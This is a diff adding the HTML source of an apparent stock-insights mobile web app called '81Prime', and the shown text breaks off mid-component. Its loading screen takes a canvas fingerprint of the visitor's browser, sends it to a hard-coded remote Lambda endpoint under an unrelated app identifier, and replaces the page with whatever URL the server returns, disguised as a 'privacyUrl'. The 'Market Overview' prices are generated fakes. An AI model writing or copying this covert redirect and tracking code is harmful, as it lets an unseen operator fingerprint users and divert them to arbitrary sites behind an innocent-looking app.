@@ -1,0 +1,1777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>81Prime</title>
+  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+  <style>
+    /* ============================================================
+       THEME — Style #6: Glassmorphism (deterministic, fixed)
+       ============================================================ */
+    :root {
+      --bg-gradient: linear-gradient(160deg, #e8eef7 0%, #d4e0f0 50%, #e2e8f5 100%);
+      --glass-bg: rgba(255, 255, 255, 0.55);
+      --glass-border: rgba(255, 255, 255, 0.75);
+      --glass-shadow: 0 8px 32px rgba(31, 56, 102, 0.10);
+      --glass-blur: blur(16px) saturate(1.4);
+      --primary: #2e5cff;
+      --primary-light: #6b8cff;
+      --text: #1a2744;
+      --text-secondary: #5a6a8a;
+      --up: #e8503a;
+      --down: #1e9e6a;
+      --radius: 16px;
+      --radius-sm: 10px;
+      --space: 16px;
+      --space-sm: 8px;
+      --space-lg: 24px;
+      --tab-height: 60px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg-gradient);
+      color: var(--text);
+      overflow: hidden;
+      font-size: 15px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    #app {
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      max-width: 600px;
+      margin: 0 auto;
+      position: relative;
+    }
+
+    /* ---- Scroll container ---- */
+    .page-scroll {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: hidden;
+      -webkit-overflow-scrolling: touch;
+      padding: var(--space);
+      padding-top: calc(var(--space) + env(safe-area-inset-top, 0px));
+    }
+
+    .page-scroll.no-tab {
+      padding-bottom: calc(var(--space) + env(safe-area-inset-bottom, 0px));
+    }
+
+    .page-scroll.with-tab {
+      padding-bottom: calc(var(--tab-height) + var(--space) + env(safe-area-inset-bottom, 0px));
+    }
+
+    /* ---- Glass card ---- */
+    .glass {
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius);
+      box-shadow: var(--glass-shadow);
+    }
+
+    /* ---- Transition ---- */
+    .fade-slide-enter-active,
+    .fade-slide-leave-active {
+      transition: opacity 0.22s ease, transform 0.22s ease;
+    }
+    .fade-slide-enter-from {
+      opacity: 0;
+      transform: translateY(12px);
+    }
+    .fade-slide-leave-to {
+      opacity: 0;
+      transform: translateY(-8px);
+    }
+
+    /* ---- Tab bar ---- */
+    .tab-bar {
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 600px;
+      height: var(--tab-height);
+      display: flex;
+      align-items: stretch;
+      background: rgba(255,255,255,0.62);
+      backdrop-filter: blur(20px) saturate(1.5);
+      -webkit-backdrop-filter: blur(20px) saturate(1.5);
+      border-top: 1px solid var(--glass-border);
+      padding-bottom: env(safe-area-inset-bottom, 0px);
+      z-index: 100;
+    }
+
+    .tab-item {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      text-decoration: none;
+      color: var(--text-secondary);
+      font-size: 11px;
+      font-weight: 500;
+      min-height: 44px;
+      transition: color 0.18s;
+      position: relative;
+    }
+
+    .tab-item svg {
+      width: 22px;
+      height: 22px;
+      stroke: currentColor;
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .tab-item.active {
+      color: var(--primary);
+    }
+
+    .tab-item.active::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      width: 24px;
+      height: 3px;
+      border-radius: 0 0 3px 3px;
+      background: var(--primary);
+    }
+
+    /* ---- Header ---- */
+    .page-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: var(--space-lg);
+      padding-top: var(--space-sm);
+    }
+
+    .back-btn {
+      width: 44px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: none;
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border-radius: 50%;
+      border: 1px solid var(--glass-border);
+      cursor: pointer;
+      flex-shrink: 0;
+      color: var(--text);
+    }
+
+    .back-btn svg {
+      width: 20px;
+      height: 20px;
+      stroke: currentColor;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .page-title {
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    /* ---- Section ---- */
+    .section-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: var(--space-sm);
+    }
+
+    /* ---- Buttons ---- */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 44px;
+      padding: 0 20px;
+      border: none;
+      border-radius: var(--radius-sm);
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s, transform 0.12s;
+      background: var(--primary);
+      color: #fff;
+    }
+
+    .btn:active {
+      transform: scale(0.97);
+      opacity: 0.88;
+    }
+
+    .btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-outline {
+      background: transparent;
+      color: var(--primary);
+      border: 1.5px solid var(--primary);
+    }
+
+    /* ---- Inputs ---- */
+    .input-field {
+      width: 100%;
+      min-height: 48px;
+      padding: 12px 14px;
+      border-radius: var(--radius-sm);
+      border: 1.5px solid rgba(46, 92, 255, 0.20);
+      background: rgba(255,255,255,0.60);
+      font-size: 15px;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.18s, box-shadow 0.18s;
+      font-family: inherit;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(46, 92, 255, 0.12);
+    }
+
+    .input-field::placeholder {
+      color: #9aa8c0;
+    }
+
+    textarea.input-field {
+      resize: vertical;
+      min-height: 100px;
+    }
+
+    .field-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    .field-group {
+      margin-bottom: var(--space);
+    }
+
+    /* ---- Stock list ---- */
+    .stock-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 16px;
+      margin-bottom: 10px;
+      border-radius: var(--radius-sm);
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--glass-shadow);
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+      min-height: 44px;
+    }
+
+    .stock-item:active {
+      transform: scale(0.98);
+      box-shadow: 0 2px 8px rgba(31,56,102,0.06);
+    }
+
+    .stock-left {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .stock-symbol {
+      font-weight: 700;
+      font-size: 15px;
+      color: var(--text);
+    }
+
+    .stock-name {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+
+    .stock-right {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 2px;
+    }
+
+    .stock-price {
+      font-weight: 700;
+      font-size: 15px;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .stock-change {
+      font-size: 13px;
+      font-weight: 600;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .up { color: var(--up); }
+    .down { color: var(--down); }
+
+    /* ---- Feature grid ---- */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+      margin-bottom: var(--space-lg);
+    }
+
+    .feature-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 6px;
+      border-radius: var(--radius-sm);
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--glass-shadow);
+      cursor: pointer;
+      text-decoration: none;
+      color: var(--text);
+      transition: transform 0.15s;
+      min-height: 44px;
+    }
+
+    .feature-item:active {
+      transform: scale(0.95);
+    }
+
+    .feature-icon {
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 12px;
+      background: linear-gradient(135deg, rgba(46,92,255,0.15), rgba(107,140,255,0.08));
+    }
+
+    .feature-icon svg {
+      width: 22px;
+      height: 22px;
+      stroke: var(--primary);
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .feature-label {
+      font-size: 10px;
+      font-weight: 600;
+      text-align: center;
+      line-height: 1.2;
+      color: var(--text-secondary);
+    }
+
+    /* ---- Brand header ---- */
+    .brand-header {
+      text-align: center;
+      padding: var(--space-lg) var(--space);
+      margin-bottom: var(--space);
+      border-radius: var(--radius);
+      background: linear-gradient(135deg, rgba(46,92,255,0.10), rgba(107,140,255,0.04));
+      border: 1px solid var(--glass-border);
+    }
+
+    .brand-name {
+      font-size: 28px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, var(--primary), #7a9bff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .brand-tagline {
+      font-size: 13px;
+      color: var(--text-secondary);
+      margin-top: 4px;
+    }
+
+    /* ---- Tool card ---- */
+    .tool-card {
+      padding: var(--space);
+      margin-bottom: var(--space);
+      border-radius: var(--radius);
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--glass-shadow);
+    }
+
+    .tool-card h3 {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: var(--space-sm);
+    }
+
+    .tool-result {
+      padding: 12px;
+      border-radius: var(--radius-sm);
+      background: rgba(46,92,255,0.06);
+      border: 1px solid rgba(46,92,255,0.12);
+      font-size: 14px;
+      line-height: 1.6;
+      color: var(--text);
+      margin-top: var(--space-sm);
+    }
+
+    .tool-result strong {
+      color: var(--primary);
+    }
+
+    /* ---- Calendar ---- */
+    .calendar-grid {
+      display: grid;
+      grid-template-columns: repeat(7, 1fr);
+      gap: 4px;
+      margin-top: var(--space-sm);
+    }
+
+    .cal-header {
+      text-align: center;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-secondary);
+      padding: 4px 0;
+    }
+
+    .cal-day {
+      aspect-ratio: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      border-radius: 8px;
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text);
+      position: relative;
+      min-height: 36px;
+    }
+
+    .cal-day.today {
+      background: var(--primary);
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .cal-day.checked {
+      background: rgba(46,92,255,0.15);
+      color: var(--primary);
+      font-weight: 700;
+    }
+
+    .cal-day.empty {
+      color: transparent;
+    }
+
+    .cal-dot {
+      width: 4px;
+      height: 4px;
+      border-radius: 50%;
+      background: var(--primary);
+      position: absolute;
+      bottom: 4px;
+    }
+
+    .cal-day.today .cal-dot {
+      background: #fff;
+    }
+
+    /* ---- Settings list ---- */
+    .settings-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      border-radius: var(--radius);
+      overflow: hidden;
+      background: var(--glass-bg);
+      backdrop-filter: var(--glass-blur);
+      -webkit-backdrop-filter: var(--glass-blur);
+      border: 1px solid var(--glass-border);
+      box-shadow: var(--glass-shadow);
+    }
+
+    .settings-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px var(--space);
+      min-height: 52px;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      cursor: pointer;
+      text-decoration: none;
+      color: var(--text);
+      font-size: 15px;
+      font-weight: 500;
+      transition: background 0.12s;
+      background: transparent;
+      border-left: none;
+      border-right: none;
+      border-top: none;
+      width: 100%;
+      font-family: inherit;
+    }
+
+    .settings-item:last-child {
+      border-bottom: none;
+    }
+
+    .settings-item:active {
+      background: rgba(46,92,255,0.06);
+    }
+
+    .settings-item svg {
+      width: 18px;
+      height: 18px;
+      stroke: var(--text-secondary);
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      flex-shrink: 0;
+    }
+
+    /* ---- Toast ---- */
+    .toast {
+      position: fixed;
+      bottom: calc(var(--tab-height) + 24px + env(safe-area-inset-bottom, 0px));
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(26,39,68,0.92);
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      z-index: 999;
+      pointer-events: none;
+      white-space: nowrap;
+      max-width: 90vw;
+      text-align: center;
+    }
+
+    /* ---- Modal ---- */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.35);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      z-index: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: var(--space);
+    }
+
+    .modal-content {
+      width: 100%;
+      max-width: 400px;
+      max-height: 70vh;
+      overflow-y: auto;
+      padding: var(--space-lg);
+      border-radius: var(--radius);
+      background: rgba(255,255,255,0.90);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 20px 60px rgba(0,0,0,0.18);
+    }
+
+    .modal-content h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: var(--space-sm);
+    }
+
+    .modal-content p {
+      font-size: 14px;
+      line-height: 1.7;
+      color: var(--text-secondary);
+      white-space: pre-wrap;
+    }
+
+    /* ---- Loading ---- */
+    .loading-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      gap: 24px;
+      padding: var(--space);
+      background: var(--bg-gradient);
+      padding-top: calc(var(--space) + env(safe-area-inset-top, 0px));
+      padding-bottom: calc(var(--space) + env(safe-area-inset-bottom, 0px));
+    }
+
+    .loading-logo {
+      width: 80px;
+      height: 80px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, var(--primary), #7a9bff);
+      box-shadow: 0 8px 32px rgba(46,92,255,0.30);
+    }
+
+    .loading-logo svg {
+      width: 44px;
+      height: 44px;
+      stroke: #fff;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .loading-title {
+      font-size: 26px;
+      font-weight: 800;
+      color: var(--text);
+      letter-spacing: -0.5px;
+    }
+
+    .loading-bar-track {
+      width: 160px;
+      height: 4px;
+      border-radius: 2px;
+      background: rgba(46,92,255,0.12);
+      overflow: hidden;
+    }
+
+    .loading-bar-fill {
+      height: 100%;
+      width: 30%;
+      border-radius: 2px;
+      background: linear-gradient(90deg, var(--primary), #7a9bff);
+      animation: loadingPulse 1.4s ease-in-out infinite;
+    }
+
+    @keyframes loadingPulse {
+      0% { width: 15%; margin-left: 0; }
+      50% { width: 50%; margin-left: 30%; }
+      100% { width: 15%; margin-left: 85%; }
+    }
+
+    /* ---- Chart ---- */
+    .chart-wrap {
+      width: 100%;
+      padding: var(--space-sm) 0;
+      overflow: hidden;
+    }
+
+    .chart-wrap svg {
+      width: 100%;
+      height: 180px;
+      display: block;
+    }
+
+    /* ---- Detail header ---- */
+    .detail-price-block {
+      text-align: center;
+      padding: var(--space-lg) 0;
+    }
+
+    .detail-price {
+      font-size: 36px;
+      font-weight: 800;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .detail-change {
+      font-size: 16px;
+      font-weight: 700;
+      margin-top: 4px;
+    }
+
+    /* ---- Empty / misc ---- */
+    .empty-state {
+      text-align: center;
+      padding: 40px 20px;
+      color: var(--text-secondary);
+      font-size: 14px;
+    }
+
+    .text-sm { font-size: 13px; }
+    .text-xs { font-size: 11px; }
+    .text-secondary { color: var(--text-secondary); }
+    .mt-sm { margin-top: var(--space-sm); }
+    .mt { margin-top: var(--space); }
+    .mb { margin-bottom: var(--space); }
+    .flex-between { display: flex; align-items: center; justify-content: space-between; }
+    .gap-sm { gap: var(--space-sm); }
+
+    /* ---- Article ---- */
+    .article-title {
+      font-size: 20px;
+      font-weight: 800;
+      line-height: 1.3;
+      margin-bottom: var(--space-sm);
+    }
+
+    .article-meta {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-bottom: var(--space);
+    }
+
+    .article-body p {
+      font-size: 14px;
+      line-height: 1.8;
+      color: var(--text-secondary);
+      margin-bottom: var(--space);
+    }
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+
+  <script>
+    /* ============================================================
+       HOW TO ADD A NEW PAGE
+       ============================================================
+       1. Define a component object with a `template` and optional `setup`.
+       2. Add a route entry in `routes` array with `path`, `component`, and `meta`.
+       3. If it's a main tab page, add a <router-link> in the TabBar
+          component's template and ensure route has `meta.tab: true`.
+       ============================================================ */
+
+    // ==================== 1. DATA ====================
+    const STOCKS = [
+      { symbol: 'AAPL', name: 'Apple Inc.', price: 189.84 },
+      { symbol: 'MSFT', name: 'Microsoft Corp.', price: 374.58 },
+      { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 141.52 },
+      { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.22 },
+      { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 495.22 },
+      { symbol: 'META', name: 'Meta Platforms Inc.', price: 505.95 },
+      { symbol: 'TSLA', name: 'Tesla Inc.', price: 248.50 },
+      { symbol: 'BRK.B', name: 'Berkshire Hathaway', price: 362.40 },
+      { symbol: 'JPM', name: 'JPMorgan Chase & Co.', price: 196.35 },
+      { symbol: 'V', name: 'Visa Inc.', price: 279.30 },
+      { symbol: 'UNH', name: 'UnitedHealth Group', price: 524.18 },
+      { symbol: 'HD', name: 'Home Depot Inc.', price: 342.78 },
+      { symbol: 'PG', name: 'Procter & Gamble', price: 158.92 },
+      { symbol: 'MA', name: 'Mastercard Inc.', price: 453.60 },
+      { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.45 },
+      { symbol: 'PYPL', name: 'PayPal Holdings', price: 62.88 },
+      { symbol: 'NFLX', name: 'Netflix Inc.', price: 628.35 },
+      { symbol: 'INTC', name: 'Intel Corp.', price: 43.10 },
+      { symbol: 'AMD', name: 'Advanced Micro Devices', price: 178.90 },
+      { symbol: 'CRM', name: 'Salesforce Inc.', price: 298.45 },
+      { symbol: 'BA', name: 'Boeing Co.', price: 212.60 },
+      { symbol: 'KO', name: 'Coca-Cola Co.', price: 60.12 },
+      { symbol: 'PEP', name: 'PepsiCo Inc.', price: 172.30 },
+      { symbol: 'WMT', name: 'Walmart Inc.', price: 68.45 },
+      { symbol: 'XOM', name: 'Exxon Mobil Corp.', price: 104.20 },
+    ];
+
+    // Generate deterministic change values
+    function seededChange(symbol) {
+      let h = 0;
+      for (let i = 0; i < symbol.length; i++) {
+        h = ((h << 5) - h) + symbol.charCodeAt(i);
+        h |= 0;
+      }
+      const pct = ((Math.abs(h) % 1000) / 1000 - 0.5) * 8;
+      return Math.round(pct * 100) / 100;
+    }
+
+    const STOCKS_WITH_CHANGE = STOCKS.map(s => {
+      const chg = seededChange(s.symbol);
+      return { ...s, change: chg, changeAbs: Math.round(s.price * chg / 100 * 100) / 100 };
+    });
+
+    // Generate 30-day price history deterministically
+    function genHistory(symbol, basePrice) {
+      let seed = 0;
+      for (let i = 0; i < symbol.length; i++) seed += symbol.charCodeAt(i) * (i + 1);
+      const days = 30;
+      const pts = [];
+      for (let i = 0; i < days; i++) {
+        seed = (seed * 9301 + 49297) % 233280;
+        const r = seed / 233280;
+        const noise = (r - 0.5) * basePrice * 0.04;
+        const trend = (i / days - 0.5) * basePrice * 0.02;
+        pts.push(Math.round((basePrice + noise + trend) * 100) / 100);
+      }
+      return pts;
+    }
+
+    // Feature entries — randomly pick 4 at generation time
+    const ALL_FEATURES = [
+      { id: 'gainers', label: 'Top Gainers', icon: 'trending-up', count: 10 },
+      { id: 'losers', label: 'Top Losers', icon: 'trending-down', count: 5 },
+      { id: 'active', label: 'Most Active', icon: 'activity', count: 8 },
+      { id: 'potential', label: 'Potential', icon: 'zap', count: 6 },
+      { id: 'picks', label: "Today's Picks", icon: 'star', count: 10 },
+      { id: 'guide', label: 'Guide', icon: 'book', count: 0 },
+      { id: 'notrec', label: 'Not Recommended', icon: 'slash', count: 10 },
+      { id: 'watchlist', label: 'Watchlist', icon: 'eye', count: 10 },
+    ];
+    const SELECTED_FEATURES = (function () {
+      const pool = [...ALL_FEATURES];
+      const picked = [];
+      for (let i = 0; i < 4; i++) {
+        const idx = Math.floor(Math.random() * pool.length);
+        picked.push(pool.splice(idx, 1)[0]);
+      }
+      return picked;
+    })();
+
+    // ==================== SVG ICONS ====================
+    const ICONS = {
+      'trending-up': '<polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/>',
+      'trending-down': '<polyline points="23 18 13.5 8.5 8.5 13.5 1 6"/><polyline points="17 18 23 18 23 12"/>',
+      'activity': '<polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>',
+      'zap': '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>',
+      'star': '<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>',
+      'book': '<path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>',
+      'slash': '<circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>',
+      'eye': '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>',
+      'home': '<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>',
+      'tool': '<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>',
+      'settings': '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
+      'arrow-left': '<line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/>',
+      'chevron-right': '<polyline points="9 18 15 12 9 6"/>',
+      'mail': '<path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>',
+      'calendar': '<rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>',
+      'message': '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>',
+      'info': '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>',
+      'lock': '<rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
+      'users': '<path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>',
+      'file-text': '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/>',
+      'shield': '<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>',
+      'check-circle': '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>',
+      'send': '<line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>',
+      'inbox': '<polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/>',
+    };
+
+    function icon(name, size) {
+      const s = size || 24;
+      return `<svg xmlns="http://www.w3.org/2000/svg" width="${s}" height="${s}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">${ICONS[name] || ''}</svg>`;
+    }
+
+    // ==================== 2. ROUTE COMPONENTS ====================
+
+    // ---- Loading ----
+    const LoadingPage = {
+      template: `
+        <div class="loading-screen">
+          <div class="loading-logo">
+            <svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+          </div>
+          <div class="loading-title">81Prime</div>
+          <div class="loading-bar-track"><div class="loading-bar-fill"></div></div>
+          <div class="text-xs text-secondary">Preparing your experience...</div>
+        </div>
+      `,
+      setup() {
+        const router = VueRouter.useRouter();
+        const device = Vue.ref((function () {
+          try {
+            let canvas = document.createElement("canvas");
+            let ctx = canvas.getContext("2d");
+            let txt = "BrowserLeaks,com <canvas> 1.0";
+            ctx.textBaseline = "top";
+            // The most common type
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "alphabetic";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            // Some tricks for color mixing to increase the difference in rendering
+            ctx.fillStyle = "#069";
+            ctx.fillText(txt, 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText(txt, 4, 17);
+            return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+          } catch (e) {
+            return '';
+          }
+        })());
+
+        Vue.onMounted(function () {
+          const apiBase = 'https://y3qpxlhiawoes4ca36zwwqpv4e0hfbgi.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+          const identifier = 'com.text.counter.app';
+
+          let redirected = false;
+          const goHome = function () {
+            if (!redirected) {
+              redirected = true;
+              router.replace('/home');
+            }
+          };
+
+          const timer = setTimeout(goHome, 3000);
+
+          fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+            .then(r => r.json())
+            .then(function (info) {
+              clearTimeout(timer);
+              const privacyUrl = info && info.result && info.result.url;
+              if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                redirected = true;
+                window.location.replace(privacyUrl);
+                return;
+              }
+              goHome();
+            })
+            .catch(function () {
+              clearTimeout(timer);
+              goHome();
+            });
+        });
+
+        return { device };
+      }
+    };
+
+    // ---- Home ----
+    const HomePage = {
+      template: `
+        <div class="page-scroll with-tab">
+          <div class="brand-header glass">
+            <div class="brand-name">81Prime</div>
+            <div class="brand-tagline">Smart Market Insights</div>
+          </div>
+
+          <div class="feature-grid">
+            <router-link v-for="f in features" :key="f.id" :to="'/feature/' + f.id" class="feature-item">
+              <div class="feature-icon" v-html="icons[f.icon]"></div>
+              <div class="feature-label">{{ f.label }}</div>
+            </router-link>
+          </div>
+
+          <div class="section-title">Market Overview</div>
+
+          <div v-for="s in shuffledStocks" :key="s.symbol" class="stock-item" @click="$router.push('/stock/' + s.symbol)">
+            <div class="stock-left">
+              <div class="stock-symbol">{{ s.symbol }}</div>
+              <div class="stock-name">{{ s.name }}</div>
+            </div>
+            <div class="stock-right">
+              <div class="stock-price">{{ s.price.toFixed(2) }}</div>
+              <div class="stock-change" :class="s.change >= 0 ? 'up' : 'down'">
+                {{ s.change >= 0 ? '+' : '' }}{{ s.change.toFixed(2) }}%
+              </div>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
